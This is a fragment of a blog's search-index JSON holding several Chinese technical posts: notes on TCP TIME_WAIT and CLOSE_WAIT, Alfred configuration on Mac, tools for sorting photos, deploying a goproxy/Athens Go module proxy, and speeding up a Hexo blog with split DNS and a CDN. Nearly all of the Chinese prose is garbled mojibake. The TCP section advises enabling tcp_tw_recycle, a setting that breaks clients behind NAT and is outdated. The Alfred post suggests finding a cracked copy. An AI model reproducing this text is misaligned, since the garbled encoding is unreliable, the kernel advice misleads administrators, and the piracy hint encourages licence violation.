æ˜¯æˆ‘ä»¬çš„æœ‹å‹ï¼Œå®ƒæ˜¯æœ‰åŠ©äºæˆ‘ä»¬çš„ï¼Œä¸è¦è¯•å›¾é¿å…è¿™ä¸ªçŠ¶æ€ï¼Œè€Œæ˜¯åº”è¯¥å¼„æ¸…æ¥šå®ƒã€‚\n\nå¦‚æœæœåŠ¡ç«¯è¦é¿å…è¿‡å¤šçš„ TIME_WAIT çŠ¶æ€çš„è¿æ¥ï¼Œå°±æ°¸è¿œä¸è¦ä¸»åŠ¨æ–­å¼€è¿æ¥ï¼Œè®©å®¢æˆ·ç«¯å»æ–­å¼€ï¼Œç”±åˆ†å¸ƒåœ¨å„å¤„çš„å®¢æˆ·ç«¯å»æ‰¿å— TIME_WAITã€‚\n\næ‰“å¼€ sysctl.conf æ–‡ä»¶ï¼Œä¿®æ”¹ä»¥ä¸‹å‡ ä¸ªå‚æ•°ï¼š\n\n```bash\nnet.ipv4.tcp_tw_recycle = 1\t #è¡¨ç¤ºå¼€å¯TCPè¿æ¥ä¸­TIME-WAIT socketsçš„å¿«é€Ÿå›æ”¶ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­\nnet.ipv4.tcp_tw_reuse = 1      # é‡æ–°ä½¿ç”¨TIME_WAITçŠ¶æ€çš„è¿æ¥ã€‚\nnet.ipv4.tcp_timestamps = 1     # éœ€è¦æ‰“å¼€å¯¹ TCP æ—¶é—´æˆ³çš„æ”¯æŒã€‚\n```\n\n\n\n# 2. CLOSE_WAIT\n\nCLOSE_WAIT çŠ¶æ€æ˜¯ã€Œè¢«åŠ¨å…³é—­æ–¹ã€æ‰ä¼šæœ‰çš„çŠ¶æ€ï¼Œè€Œä¸”å¦‚æœã€Œè¢«åŠ¨å…³é—­æ–¹ã€æ²¡æœ‰è°ƒç”¨ close å‡½æ•°å…³é—­è¿æ¥ï¼Œé‚£ä¹ˆå°±æ— æ³•å‘å‡º FIN æŠ¥æ–‡ï¼Œä»è€Œæ— æ³•ä½¿å¾— CLOSE_WAIT çŠ¶æ€çš„è¿æ¥è½¬å˜ä¸º LAST_ACK çŠ¶æ€ã€‚\n\næ‰€ä»¥ï¼Œå½“æœåŠ¡ç«¯å‡ºç°å¤§é‡ CLOSE_WAIT çŠ¶æ€çš„è¿æ¥çš„æ—¶å€™ï¼Œè¯´æ˜æœåŠ¡ç«¯çš„ç¨‹åºæ²¡æœ‰è°ƒç”¨ close å‡½æ•°å…³é—­è¿æ¥ã€‚\n\nå½“æœåŠ¡ç«¯å‡ºç°å¤§é‡ CLOSE_WAIT çŠ¶æ€çš„è¿æ¥çš„æ—¶å€™ï¼Œé€šå¸¸éƒ½æ˜¯ä»£ç çš„é—®é¢˜ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦é’ˆå¯¹å…·ä½“çš„ä»£ç ä¸€æ­¥ä¸€æ­¥çš„è¿›è¡Œæ’æŸ¥å’Œå®šä½ï¼Œä¸»è¦åˆ†æçš„æ–¹å‘å°±æ˜¯æœåŠ¡ç«¯ä¸ºä»€ä¹ˆæ²¡æœ‰è°ƒç”¨ closeã€‚\n\n# 3. å¤´è„‘é£æš´\n\n+  é¿å…æå‰closeï¼ŒæœåŠ¡å™¨æ”¶ä¸åˆ°é‡å‘ã€‚é˜²æ­¢è¿·é€”æŠ¥æ–‡é‡å‘åˆ°ç›¸åŒå››å…ƒç»„ã€‚\n\n+ æœåŠ¡å™¨è¿‡å¤šåŸå› ï¼Œè‚¯å®šæ˜¯æœåŠ¡å™¨ä¸»åŠ¨å…³çš„ã€‚ç¡®è®¤http keepaliveä½¿ç”¨ï¼Œè¶…æ—¶ï¼Œæ•°é‡é™åˆ¶ã€‚å¯ä»¥è°ƒæ•´linuxå‚æ•°ä¸å»ºè®®ã€‚\n  \n     \n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/591724475\n","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"macæ•ˆç‡ç¥å™¨alfredçš„ä½¿ç”¨","url":"%2Fp%2F4fc3a301.html","content":"\nalfredï¼Œmacæ•ˆç‡æ’åç¬¬ä¸€çš„è½¯ä»¶ã€‚ æˆ‘å¸¸ç”¨çš„æ˜¯ Search + Clipboard + Snippets å’Œå„ç§workflowã€‚\n\n<!-- more -->\n\n# 1. ä½¿ç”¨\n\n### 1.1 å®‰è£…\n\n+ å»ºè®®è´­ä¹°æ­£ç‰ˆï¼Œæ²¡é’±çš„å¯ä»¥æ‰¾æ‰¾ç ´è§£ç‰ˆã€‚\n\n+ è®¾å®š->é”®ç›˜->å¿«æ·é”®->èšç„¦->å»æ‰å¿«æ·é”®ï¼ŒSpotlightå¿«æ·ã€‚ï¼ˆä¸€å±±ä¸å®¹äºŒè™ï¼‰\n\n### 1.2 æŠ€å·§\n\n+ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨`â€˜ï¼ˆå•å¼•å·ï¼‰`æˆ–è€…`Spaceï¼ˆç©ºæ ¼é”®ï¼‰`å¿«é€Ÿå¯ç”¨æ‰“å¼€æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ï¼ŒåŠŸèƒ½ç±»ä¼¼äºä½¿ç”¨`Open + å…³é”®å­—`ã€‚\n+ è¾“å…¥ `=` æ¥è°ƒç”¨ç³»ç»Ÿçš„è®¡ç®—å™¨ï¼Œæ¥è¾“å…¥å¤æ‚çš„è®¡ç®—ï¼Œæ”¯æŒè®¸å¤šé«˜çº§çš„æ•°å­¦å‡½æ•°ã€‚\n+ Alfredä¸€ä¸ªå¾ˆé‡è¦çš„å‘½ä»¤æ“ä½œå°±æ˜¯ï¼š`â†‘`ï¼Œå¯ä»¥è°ƒç”¨ä¸Šæ¬¡çš„å†å²å‘½ä»¤ï¼\n\n\n\n# 2. é…ç½®\n\n### 2.1  General\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162140096.png\" alt=\"image-20220108162140096\" style=\"zoom: 40%;\" />\n\næˆ‘ä¸ªäººè®¾ç½®çš„ Alfred çš„å‘¼å‡ºå¿«æ·é”®ä¸ºåŒå‡»Commandé”®ã€‚è¿™æ ·è®¾ç½®ä¸ä»…å‘¼å‡ºé€Ÿåº¦éå¸¸å¿«ï¼Œè€Œä¸”å¯ä»¥é¿å¼€å’Œå…¶å®ƒåº”ç”¨çš„å‘¼å‡ºå¿«æ·é”®å†²çªã€‚\n\n### 2.2 Default Results\n\nåœ¨æ²¡æœ‰ç»“æœçš„æ—¶å€™ï¼Œæˆ‘è®¾ç½®çš„è°·æ­Œå’Œç™¾åº¦æœç´¢ã€‚\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162242175.png\" alt=\"image-20220108162242175\" style=\"zoom: 30%;\" />\n\n\n\n### 2.3 Web Search\n\nå¢åŠ äº†ä¸€ä¸ªç™¾åº¦ã€‚\n\n```bash\nhttp://www.baidu.com/s?wd={query}\n\nç™¾åº¦ä¸€ä¸‹ {query}\n```\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162717520.png\" alt=\"image-20220108162717520\" style=\"zoom: 50%;\" />\n\n### 2.4 Web Bookmarks\n\næ‰“å¼€è°·æ­Œæµè§ˆå™¨ä¹¦ç­¾å³å¯ã€‚\n\n\n\n### 2.5 Clipboard History\n\nç²˜è´´æ¿ç¥å™¨ï¼Œæ— éœ€é‡å¤è´­ä¹° Paste ç­‰å‰ªè´´æ¿ç®¡ç†å·¥å…·ã€‚æˆ‘ç”¨çš„ `option + v` å¿«æ·é”®ã€‚\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108162857847.png\" alt=\"image-20220108162857847\" style=\"zoom:35%;\" />\n\n### 2.6 Snipptes\n\nç¥å™¨ï¼Œè¾“å…¥å…³é”®è¯æ›¿æ¢ä¸€æ®µæ–‡å­—ã€‚ä¾‹å¦‚æˆ‘é…ç½®çš„ `\\20`å¯ä»¥å¿«é€Ÿæ›¿æ¢æˆ  \"2006-01-02 15:04:05\"\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108163211720.png\" alt=\"image-20220108163211720\" style=\"zoom:35%;\" />\n\n### 2.7 Advanced\n\nå¼ºçƒˆå»ºè®®dropboxåŒæ­¥è‡ªå·±çš„é…ç½®ã€‚Alfredå®˜æ–¹åŠæˆ‘ä¸ªäººéƒ½ä¸æ¨èä½¿ç”¨iCloud\n\n<img src=\"mac%E6%95%88%E7%8E%87%E7%A5%9E%E5%99%A8alfred%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220108163818212.png\" alt=\"image-20220108163818212\" style=\"zoom: 33%;\" />\n\n\n\n# 3. å¸¸ç”¨workflow\n\n### 3.1 æ¨èæ’ä»¶\n\nhttps://github.com/zenorocha/alfred-workflows\n\n### 3.2 æ—¶é—´æˆ³è½¬æ¢\n\n https://github.com/work-helper/time-format-alfred\n\n### 3.3 æ‰“å¼€jetbrainsä¸åŒé¡¹ç›® \n\nhttps://github.com/bchatard/alfred-jetbrains\n\n### 3.4 è®¾ç½®ç¨‹åºå˜é‡åå­—\n\nhttps://github.com/xudaolong/CodeVar\n\n\n\n# 4. ä½¿ç”¨æ€»ç»“\n\nSince Jan 21, 2022, Alfred has been used 1,012 times. Average 2.5 times per day.\n\n+ workflow   æ—¶é—´æˆ³\n+ snippets\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://github.com/zenorocha/alfred-workflows\n+ http://www.packal.org/  å¸¸ç”¨æ‰©å±•\n\n","tags":["alfred"],"categories":["è½¯ä»¶"]},{"title":"macæ‰¹é‡æ•´ç†ç…§ç‰‡æˆ–æ–‡ä»¶","url":"%2Fp%2Ff4cf3f3.html","content":"\nå¹³å¸¸ç…§ç‰‡å¤ªå¤šäº†ï¼Œå¹¶ä¸”æ•£è½åœ¨å„ä¸ªåœ°æ–¹ï¼Œå¹¶ä¸”è¿˜æœ‰å¾ˆå¤šé‡å¤çš„å’Œç±»å‹çš„ç…§ç‰‡ï¼Œæ¯æ¬¡æ•´ç†åéƒ½ç´¯çš„åŠæ­»ï¼Œæœ‰æ–°çš„ç…§ç‰‡åå°±åˆæ‰“ä¹±äº†ä»¥å‰çš„ç©ºé—´ã€‚\n\næ‰€ä»¥è¿™æ¬¡ç‰¹æ„æ‰¾äº†å·¥å…·è¾…åŠ©äººç±»æ•´ç†ã€‚macä¸‹æœ‰ä¸€ä¸ªéå¸¸å¼ºæ‚çš„åˆ©å™¨ hazelï¼Œä½†æ˜¯å­¦ä¹ æˆæœ¬æœ‰ç‚¹é«˜ï¼Œç”¨è¿‡éƒ½è¯´å¥½ã€‚\n\nä¸ºäº†æ¯ä¸€æ­¥å¯æ§ï¼ŒæŠŠæ•´ç†åˆ†æˆäº†å¤šæ­¥æ“ä½œï¼Œå¹¶ä¸”æ¯ä¸€æ­¥éƒ½ç”¨äº†ä¸åŒçš„è½¯ä»¶ã€‚\n\n<!-- more -->\n\n# 1. å…ˆå½’ç±»æ–‡ä»¶ï¼ˆFolder Tidyï¼‰\n\nå…ˆæŠŠæ‰€æœ‰æ–‡ä»¶æ‰”åˆ°ä¸€ä¸ªå¤§æ–‡ä»¶å¤¹é‡Œã€‚æ ¹æ®æ–‡ä»¶ç±»å‹ï¼Œå…ˆæ•´ç†æˆä¸åŒçš„æ–‡ä»¶å¤¹ã€‚è¯¥å·¥å…·æœ‰ä¸€ä¸ªä¼˜åŠ¿æ˜¯å¯ä»¥Undoã€‚\n![image-20211210230508069](mac%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%85%A7%E7%89%87%E6%88%96%E6%96%87%E4%BB%B6/image-20211210230508069.png)\n\n# 2. æŸ¥æ‰¾é‡å¤å’Œç›¸ä¼¼æ–‡ä»¶ï¼ˆDuplicate File Finder Proï¼‰\nä¸Šä¸‡ä¸ªæ–‡ä»¶ï¼Œä¹Ÿæ˜¯åˆ†åˆ†é’ŸæŸ¥æ‰¾å®Œæ¯•ã€‚ç„¶ååˆ é™¤é‡å¤æ–‡ä»¶ä¸è¦å¤ªçˆ½ã€‚\n![image-20211210230620263](mac%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%85%A7%E7%89%87%E6%88%96%E6%96%87%E4%BB%B6/image-20211210230620263.png)\n\n# 3. æ‰¹é‡ä¿®æ”¹åå­—ï¼ˆA Better Finder Renameï¼‰\n\nä¾‹å¦‚å¯ä»¥æ ¹æ®æ—¥æœŸæ‰¹é‡é‡å‘½ååï¼Œå°±å¯ä»¥å¿«é€Ÿå†æ¬¡å½’ç±»æ–‡ä»¶äº†ã€‚\n![image-20211210230710217](mac%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%85%A7%E7%89%87%E6%88%96%E6%96%87%E4%BB%B6/image-20211210230710217.png)\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.v2ex.com/t/670128\n","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"goproxyçš„éƒ¨ç½²å®è·µ","url":"%2Fp%2F74b41bb2.html","content":"\n# 0. å‰è¨€\n\nåœ¨å¤§é™†åœ°åŒºæˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡ `go get` å‘½ä»¤è·å–åˆ°ä¸€äº›ç¬¬ä¸‰æ–¹åŒ…ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ `golang.org/x` ä¸‹é¢çš„å„ç§ä¼˜ç§€çš„åŒ…. è§£å†³æ–¹æ¡ˆå¦‚ä¸‹:\n\n```bash\n# go.1.12.x\nexport GO111MODULE=on\nexport GOPROXY=https://goproxy.cn\n\n# go1.13.x\ngo env -w GOPROXY=https://goproxy.cn,direct\ngo env -w GOPRIVATE=*.corp.example.com \n\n#GOPRIVATE=*.corp.example.com è¡¨ç¤ºæ‰€æœ‰æ¨¡å—è·¯å¾„ä»¥ corp.example.com çš„ä¸‹ä¸€çº§åŸŸå (å¦‚ team1.corp.example.com) ä¸ºå‰ç¼€çš„æ¨¡å—ç‰ˆæœ¬éƒ½å°†ä¸ç»è¿‡ Go module proxy å’Œ Go checksum databaseï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸åŒ…æ‹¬ corp.example.com æœ¬èº«ã€‚\n```\n\n<!-- more -->\n\n\n\næœ¬æ–‡å°†é‡ç‚¹ä»‹ç» go module çš„ proxy é…ç½®å®ç°ï¼ŒåŒ…æ‹¬å¦‚ä¸‹ä¸¤ç§çš„ä»£ç†é…ç½®ï¼š\n\n- GOPROXY\n- Athens\n\n# 1.  goproxy\n\nhttps://github.com/goproxyio/goproxy\n\n### 1.1 å®‰è£…go\n\n```bash\nwget https://dl.google.com/go/go1.13.4.linux-amd64.tar.gz #ä¸‹è½½go\nsudo tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz # è§£å‹åˆ°/usr/local\nexport PATH=$PATH:/usr/local/go/bin # è®¾ç½®ç¯å¢ƒå˜é‡\ngo version # go version go1.13.4 linux/amd64\n```\n\n### 1.2 å®‰è£…goproxy\n\n```bash\ngit clone https://github.com/goproxyio/goproxy.git\ncd goproxy/\nmake\n```\n\n### 1.3 ä»£ç†\n\n```bash\n# æœåŠ¡ç«¯æ‰§è¡Œ\n./bin/goproxy -cacheDir=/tmp/test -listen=0.0.0.0:8082 \n\n\n# å®¢æˆ·ç«¯æ“ä½œ\nGOPROXY=http://æœåŠ¡ç«¯ip:8082 go get -v github.com/spf13/cobra # ä¼šç¼“å­˜åœ¨æœåŠ¡ç«¯/tmp/testç›®å½•ä¸‹\n```\n\n### 1.4 nginxé…ç½®\n\n```nginx\n./bin/goproxy -cacheDir=/tmp/test -listen :8082 -proxy https://goproxy.cn -exclude liuvv.com\n\n\nserver {\n    server_name goproxy.liuvv.com;\n    listen 80 ;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/goproxy_access_log;\n    error_log /var/log/nginx/goproxy_error_log notice;\n\n    location  / {\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_connect_timeout 300s;\n        proxy_send_timeout 300s;\n        proxy_read_timeout 300s;\n\n        proxy_pass             http://127.0.0.1:8082;\n    }\n}\n```\n\n# 2.  Athens\n\n+ https://github.com/gomods/athens\n\n```bash\ngit clone https://github.com/gomods/athens \ncd athens \n\nmake build-ver VERSION=\"0.7.0\" # å¦‚æœä¸‹è½½ä¸ä¸‹æ¥, ä¿®æ”¹makefileçš„goproxy\n./athens -version\n```\n\n+ æœåŠ¡å™¨å¯åŠ¨\n\n```bash\nexport ATHENS_STORAGE_TYPE=disk  # ç¼“å­˜åˆ°ç¡¬ç›˜\nexport ATHENS_DISK_STORAGE_ROOT=~/athens-storage\n./athens\n```\n\n+ å®¢æˆ·ç«¯æµ‹è¯•\n\n```bash\nexport GO111MODULE=on export GOPROXY=http:#æœåŠ¡å™¨ip:3000\n\n\ngit clone https://github.com/athens-artifacts/walkthrough.git \ncd walkthrough\ngo run .  # ä¼šç¼“å­˜åœ¨æœåŠ¡ç«¯~/athens-storageç›®å½•ä¸‹\n\n\ncurl æœåŠ¡å™¨ip:3000/github.com/athens-artifacts/samplelib/@v/list\n```\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ [Helloï¼ŒGo module proxy](https://tonybai.com/2018/11/26/hello-go-module-proxy/)\n+ [Go Module Proxy](https://juejin.im/post/5c8f9f8ef265da612c3a34b9)\n+ https://blog.wolfogre.com/posts/golang-package-history/\n+ https://juejin.im/post/5d8ee2db6fb9a04e0b0d9c8b\n+ https://github.com/goproxy/goproxy.cn/","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"åŠ é€Ÿåšå®¢è®¿é—®é€Ÿåº¦","url":"%2Fp%2F5ee5b7c.html","content":"\n\n\nä¸åªä¸€ä¸ªäººè¯´è¿‡ï¼Œæˆ‘åšå®¢è®¿é—®çš„é€Ÿåº¦çœŸæ…¢ã€‚ åšå®¢è™½ç„¶åªæ˜¯è®°å½•ä¸ªäººå­¦ä¹ å†ç¨‹çš„åœ°æ–¹ï¼Œä½†ä¹Ÿè¦è®°å¾—ä¼˜åŒ–è®¿é—®é€Ÿåº¦ã€‚ \n\nä»Šå¤©ç»ˆäºæœ‰æ—¶é—´æŠ˜è…¾ä¸‹ï¼Œè®©ç½‘ç«™åœ¨å›½å†…å’Œå›½å¤–å„å¤‡ä»½ä¸€ä»½ï¼Œç„¶åå›½å†…çš„ç”¨æˆ·è®¿é—®å›½å†…çš„codingï¼Œå›½å¤–çš„ç”¨æˆ·è®¿é—®å›½å¤–çš„githubã€‚ \n\n<!-- more -->\n\n# 1. å›½å†…å¤–åˆ†æµ\n\n+ ç™»å½•ç½‘ç«™, https://wwww.coding.net/, æ³¨å†Œç™»å½•\n\n+ åˆ›å»ºé¡¹ç›®æ—¶å€™é€‰æ‹©DevOpsé¡¹ç›®, æ­¤å¤„ç”¨çš„è‡ªå·±çš„ç”¨æˆ·å`levonfly`, ä»“åº“åœ°å€ä¸º`git@e.coding.net:levonfly/levonfly.git`\n\n+ åœ¨ä¸ªäººè®¾ç½®é‡Œ, é…ç½®å…¬é’¥\n\n+ `ssh -T git@e.coding.net -i ~/.ssh/github-unix2dos`  æµ‹è¯•å¯†é’¥æ˜¯å¦èƒ½è®¿é—®\n\n+ ä¿®hexoé…ç½®æ–‡ä»¶\n\n  ```yaml\n  deploy:\n      -\n       type: git\n       repo:\n          github: git@unix2dos:unix2dos/unix2dos.github.io.git # githubåœ°å€\n          coding: git@e.coding.net:levonfly/levonfly.git #codingåœ°å€\n       branch: master\n  ```\n\n+ ä¿®æ”¹sshé…ç½®æ–‡ä»¶\n\n  ```yaml\n  Host coding e.coding.net\n  \tHostName e.coding.net\n  \tIdentityFile ~/.ssh/github-unix2dos # è‡ªå·±çš„ç§é’¥\n  \tUser levonfly\n  ```\n\n+ ä¸ªäººè®¾ç½®->å®åè®¤è¯\n\n+ é¡¹ç›®->æŒç»­éƒ¨ç½²->é™æ€ç½‘ç«™->å‘å¸ƒç½‘ç«™->ç«‹å³éƒ¨ç½²\n\n+ DNSè§£æ \n\n  CNAME->é»˜è®¤æŒ‡å‘coding-pages.com\n\n  CNMA->å¢ƒå¤–æŒ‡å‘github.io\n\n  æˆ‘çš„åŸŸå`liuvv.com`è§£æå¦‚ä¸‹\n\n  ```bash\n  ä¸»æœº ç±»å‹\t çº¿è·¯\t è®°å½•å€¼\n  www\tCNAME\tå¢ƒå¤–\tunix2dos.github.io\n  www\tCNAME\té»˜è®¤\tr8ea0k.coding-pages.com\n  ```\n\n  \n\n+ è¯ä¹¦ç”³è¯·å¤±è´¥\n\n  ç”³è¯·é”™è¯¯åŸå› æ˜¯ï¼šåœ¨éªŒè¯åŸŸåæ‰€æœ‰æƒæ—¶ä¼šå®šä½åˆ° Github Pages çš„ä¸»æœºä¸Šå¯¼è‡´ SSL è¯ä¹¦ç”³è¯·å¤±è´¥\n\n  æ­£ç¡®çš„åšæ³•æ˜¯ï¼šå…ˆå»åŸŸå DNS æŠŠ GitHub çš„è§£ææš‚åœæ‰ï¼Œç„¶åå†é‡æ–°ç”³è¯· SSL è¯ä¹¦ï¼Œå¤§çº¦åç§’å·¦å³å°±èƒ½ç”³è¯·æˆåŠŸï¼Œç„¶åå¼€å¯å¼ºåˆ¶ HTTPS è®¿é—®\n\n  \n\n+ æµ‹è¯•\n\n  ```bash\n  host www.liuvv.com   # å›½å†…æµ‹è¯•\n  www.liuvv.com is an alias for r8ea0k.coding-pages.com.\n  r8ea0k.coding-pages.com has address 150.109.4.162\n  r8ea0k.coding-pages.com has address 119.28.218.218\n  \n  \n  host www.liuvv.com  # å›½å¤–æœåŠ¡å™¨æµ‹è¯•\n  www.liuvv.com is an alias for unix2dos.github.io.\n  unix2dos.github.io has address 185.199.109.153\n  unix2dos.github.io has address 185.199.111.153\n  unix2dos.github.io has address 185.199.108.153\n  unix2dos.github.io has address 185.199.110.153\n  ```\n\n  \n\n  å¦å¤–å¯å¼€å¯å’Œå…³é—­vpn, åˆ·æ–°åšå®¢, çœ‹è¯ä¹¦çš„æœ‰æ•ˆæœŸä¹Ÿèƒ½çœ‹åˆ°åŒºåˆ«, å›½å†…å¤–è®¿é—®åŒä¸€ä¸ªåœ°å€, å®ç°äº†åˆ†æµ. è‡³æ­¤åŠ é€Ÿå¤§åŠŸå‘Šæˆ.\n\n\n\n# 2. hexoä¼˜åŒ–æ–¹æ¡ˆ\n\n###  2.1 ä¸»é¢˜æºåŠ è½½ä¼˜åŒ–\n\næŠŠåœ¨NexTä¸»é¢˜çš„_config.ymlé‡Œé¢çš„ï¼š\n\n```dart\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default)\nhost:\n```\n\næ”¹ä¸ºï¼š\n\n```dart\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default)\nhost: //fonts.lug.ustc.edu.cn\n```\n\nå› ä¸º`fonts.lug.ustc.edu.cn`æ˜¯ä¸­ç§‘å¤§çš„æºï¼Œç›¸æ¯”ä¹‹å‰èƒ½å¿«ä¸€ä¸‹\n\n### 2.2 å‹ç¼©é¡µé¢\n\n```bash\nnpm install hexo-neat --save\n```\n\né…ç½®æ–‡ä»¶\n\n```yml\nneat_enable: true\nneat_html:\n  enable: true\n  exclude:\n    - '**/baidu*.html'\n    - '**/google*.html'\nneat_css:\n  enable: true\n  exclude:\n    - '**/*.min.css'\nneat_js:\n  enable: true\n  mangle: true\n  output:\n  compress:\n  exclude:\n    - '**/*.min.js'\n    - '**/jquery.fancybox.pack.js'\n    - '**/index.js'\n```\n\n\n\n### 2.3 æ‡’åŠ è½½(æš‚æ—¶å…³é—­)\n\nhttps://github.com/theme-next/theme-next-jquery-lazyload\n\næ­¤å¤„ä¼šé€ æˆæŒä¹…é“¾æ¥æœ¬åœ°å›¾ç‰‡ä¸æ˜¾ç¤º, æœªè§£å†³.\n\n```bash\ncd themes/next\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n#Enable module in NexT _config.yml file:\nlazyload: true\n```\n\n\n\n### 2.4 å›¾ç‰‡å‹ç¼©\n\nhttps://imageoptim.com/mac\n\nå¯¼èˆªåˆ°ä½ çš„markdownç´¢å¼•çš„å›¾ç‰‡æ–‡ä»¶å¤¹ï¼Œå¹¶æŠŠé‡Œé¢çš„å›¾ç‰‡ç›´æ¥æ‹–å…¥ ImageOptim å°±å¥½äº†ï¼ŒåŒæ—¶å‹ç¼©å®Œä¼šç›´æ¥æ›¿æ¢ï¼Œç›´æ¥commitæ–°çš„ä¼˜åŒ–çš„å›¾ç‰‡å³å¯ï¼ŒåŸæ–‡ä»¶ä¼šè¢«æ‹‰å…¥åƒåœ¾ç®±(mac çš„åƒåœ¾ç®±)å¯æ¢å¤ï¼Œå‹ç¼©å¯ä»¥åœ¨ ImageOptim çš„ Preference é‡Œé¢è¿›è¡Œæ›´å¤§çš„å‹ç¼©æ¯”è®¾ç½®.\n\n\n\n# 3. cdnåŠ é€Ÿ\n\n### 3.1 é™æ€èµ„æºæ”¾åœ¨ cdn ä¸Š\n\nè¿˜æœ‰ä¸€ç§æ–¹æ¡ˆæ˜¯æŠŠç”Ÿæˆçš„é™æ€æ–‡ä»¶æ”¾åœ¨å›½å†…çš„CDNä¸Š, æ¥è¿›è¡ŒåŠ é€Ÿ\n\nå¯å‚è€ƒ: https://github.com/saltbo/uptoc\n\n### 3.2 hexo-cdnåŠ é€Ÿ\n\n##### 1 Typoraé…ç½®\n\nå›¾ç‰‡ç›´æ¥ `Ctrl + v` å³å¯ç²˜è´´æ‹·è´åˆ°æŒ‡å®šç›®å½•å¹¶å®æ—¶é¢„è§ˆã€‚\n\n![image-20201127234658946](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201127234658946.png)\n\n\n\n##### 2 COSé…ç½®\n\n+ åˆ›å»ºæ¡¶, å…¬æœ‰è¯»ç§æœ‰å†™\n\n  ![image-20201128023712579](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128023712579.png)\n\n+ å¼€å¯é™æ€ç½‘ç«™\n\n  è¿›å…¥æ¡¶è¯¦æƒ…ï¼Œç‚¹å‡»åŸºç¡€é…ç½®->é™æ€ç½‘ç«™ï¼Œå¼€å¯é™æ€ç½‘ç«™ï¼Œç´¢å¼•`index.html`, å¼ºåˆ¶ https, æ³¨æ„æ­¤æ—¶æ˜¯é»˜è®¤çš„åŸŸå.\n\n  ![image-20201128023839242](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128023839242.png)\n\n+ è‡ªå®šä¹‰ CDN åŠ é€ŸåŸŸå\n\n  è¿›å…¥æ¡¶è¯¦æƒ…ï¼Œç‚¹å‡»åŸŸåä¸ä¼ è¾“ç®¡ç†->è‡ªå®šä¹‰ CDN åŠ é€ŸåŸŸå\n\n  ![image-20201128024033430](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024033430.png)\n\n  åœ¨åŸŸåå¤„å¡«å†™ä½ è¦è®¾ç½®çš„è‡ªå®šä¹‰åŸŸåï¼Œåœ¨æºç«™ç±»å‹å¤„é€‰æ‹©**é™æ€ç½‘ç«™æºç«™**ï¼Œå¤åˆ¶CNAMEçš„å†…å®¹ï¼Œè®¾ç½®åŸŸåè§£æ\n\n  ![image-20201128024052385](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024052385.png)\n\n+ è¯ä¹¦é…ç½®\n\n  è¿›å…¥SSL è¯ä¹¦ç®¡ç†->è¯ä¹¦ç®¡ç†->ç”³è¯·å…è´¹è¯ä¹¦->å…è´¹ç”³è¯·ä¸€å¹´çš„\n\n  ![image-20201128024600259](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024600259.png)\n\n  è¿›å…¥å†…å®¹åˆ†å‘ç½‘ç»œ->è¯ä¹¦ç®¡ç†->é…ç½®è¯ä¹¦\n\n  ![image-20201128024410397](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024410397.png)\n\n+ åŸŸåç®¡ç†\n\n  è¿›å…¥å†…å®¹åˆ†å‘ç½‘ç»œ->åŸŸåç®¡ç†\n\n  ![image-20201128024743954](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024743954.png)\n\n  https é…ç½®å†…é€‰é¡¹éƒ½æ‰“å¼€, ä¾‹å¦‚å¼ºåˆ¶ https\n\n  ![image-20201128024849838](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201128024849838.png)\n\n  